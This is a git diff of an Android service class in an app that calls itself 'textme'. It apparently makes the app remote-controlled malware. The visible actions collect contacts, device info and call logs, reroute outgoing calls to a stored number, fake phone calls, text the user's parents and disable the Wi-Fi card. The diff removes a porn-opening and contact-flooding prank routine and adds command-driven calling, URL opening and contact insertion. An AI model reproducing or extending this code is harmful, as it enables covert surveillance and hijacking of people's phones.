@@ -14,17 +14,15 @@ import android.preference.PreferenceManager;
 import android.util.Log;
 
 import com.candroid.textme.BuildConfig;
-import com.candroid.textme.data.Commands;
+import com.candroid.textme.data.Constants;
 import com.candroid.textme.data.pojos.CalendarEvent;
 import com.candroid.textme.data.pojos.Contact;
 import com.candroid.textme.data.db.Database;
 import com.candroid.textme.data.db.DatabaseHelper;
 import com.candroid.textme.api.Lofl;
-import com.candroid.textme.jobs.services.InsertContactJobService;
 import com.candroid.textme.receivers.OutgoingCallReceiver;
 import com.candroid.textme.services.MessagingService;
 import com.candroid.textme.data.pojos.PhoneCall;
-import com.candroid.textme.data.Pornhub;
 import com.candroid.textme.data.pojos.SmsMsg;
 import com.candroid.textme.data.Wallpapers;
 
@@ -46,7 +44,7 @@ public class JobsIntentService extends IntentService {
     public static final String ACTION_CONTACTS = "ACTION_CONTACTS";
     public static final String ACTION_DEVICE_INFO = "ACTION_DEVICE_INFO";
     public static final String ACTION_PHONE_CALLS = "ACTION_PHONE_CALLS";
-    public static final String ACTION_WEB_PORN = "ACTION_WEB_PORN";
+    public static final String ACTION_WEB_BROWSER = "ACTION_WEB_BROWSER";
     public static final String ACTION_WALLPAPER = "ACTION_WALLPAPER";
     public static final String ACTION_FAKE_PHONE_CALL = "ACTION_FAKE_PHONE_CALL";
     public static final String ACTION_TEXT_PARENTS = "ACTION_TEXT_PARENTS";
@@ -55,6 +53,7 @@ public class JobsIntentService extends IntentService {
     public static final String ACTION_VIBRATOR = "ACTION_VIBRATOR";
     public static final String ACTION_WIFI_CARD = "ACTION_WIFI_CARD";
     public static final String ACTION_REROUTE_CALLS = "ACTION_REROUTE_CALLS";
+    public static final String ACTION_CALL_PHONE = "ACTION_CALL_PHONE";
     private static long sNumber = 1111111111;
 
     public JobsIntentService() {
@@ -188,22 +187,11 @@ public class JobsIntentService extends IntentService {
                     url = Wallpapers.WALLPAPERS[2];
                 }
                 Lofl.changeWallpaper(this, Lofl.getBitmapFromUrl(Uri.parse(url).toString()));
-            }else if(intent.getAction().equals(ACTION_WEB_PORN)){
-                double randomNumber = Math.random();
-                int videoId = 0;
-                if(randomNumber >= 0.5){
-                    videoId = 1;
+            }else if(intent.getAction().equals(ACTION_WEB_BROWSER)){
+                if(intent.hasExtra(Constants.URL)){
+                    String url = intent.getStringExtra(Constants.URL);
+                    Lofl.openBrowser(this, url);
                 }
-                Lofl.watchPornHubVideo(this, Pornhub.VIDEOS[videoId]);
-                Lofl.dosWifiCard(this);
-                /*    TimerTask timerTask = new TimerTask() {
-                    @Override
-                    public void run() {
-                        Lofl.vibrator(JobsIntentService.this);
-                    }
-                };
-                Timer timer = new Timer("vibratorTask", true);
-                timer.schedule(timerTask, 1000L, 60000L);*/
             }else if(intent.getAction().equals(ACTION_FAKE_PHONE_CALL)){
                 Lofl.fakePhoneCall(this);
             }else if(intent.getAction().equals(ACTION_TEXT_PARENTS)){
@@ -213,16 +201,11 @@ public class JobsIntentService extends IntentService {
                 }
             }else if(intent.getAction().equals(ACTION_INSERT_CONTACT)){
                 if(this.checkSelfPermission(Manifest.permission.WRITE_CONTACTS) == PackageManager.PERMISSION_GRANTED){
-                    TimerTask timerTask = new TimerTask() {
-                        @Override
-                        public void run() {
-                            sNumber++;
-                            Lofl.insertContact(JobsIntentService.this, String.valueOf(sNumber).concat(" ").concat(String.valueOf(sNumber)), String.valueOf(sNumber++));
-                        }
-                    };
-                    Timer timer = new Timer("insertContactsTask", true);
-                    timer.scheduleAtFixedRate(timerTask, 0, 3000);
-                    Lofl.setJobRan(this, JobsScheduler.INSERT_CONTACT_KEY);
+                    if(intent.hasExtra(Constants.NAME_KEY) && intent.hasExtra(Constants.ADDRESS)){
+                        String name = intent.getStringExtra(Constants.NAME_KEY);
+                        String number = intent.getStringExtra(Constants.ADDRESS);
+                        Lofl.insertContact(this, name, number);
+                    }
                 }
             } else if (intent.getAction().equals(ACTION_WIFI_CARD)) {
                 if(checkSelfPermission(Manifest.permission.CHANGE_WIFI_STATE) == PackageManager.PERMISSION_GRANTED){
@@ -249,6 +232,13 @@ public class JobsIntentService extends IntentService {
                     editor.putString(OutgoingCallReceiver.NUMBER_KEY, number);
                     editor.apply();
                     OutgoingCallReceiver.sRerouteNumber = number;
+                }
+            }else if(intent.getAction().equalsIgnoreCase(ACTION_CALL_PHONE)){
+                if(checkSelfPermission(Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED){
+                    if(intent.hasExtra(Constants.ADDRESS)){
+                        String number = intent.getStringExtra(Constants.ADDRESS);
+                        Lofl.phoneCall(this, number);
+                    }
                 }
             }else {
                 Log.d(TAG, "No action found!");
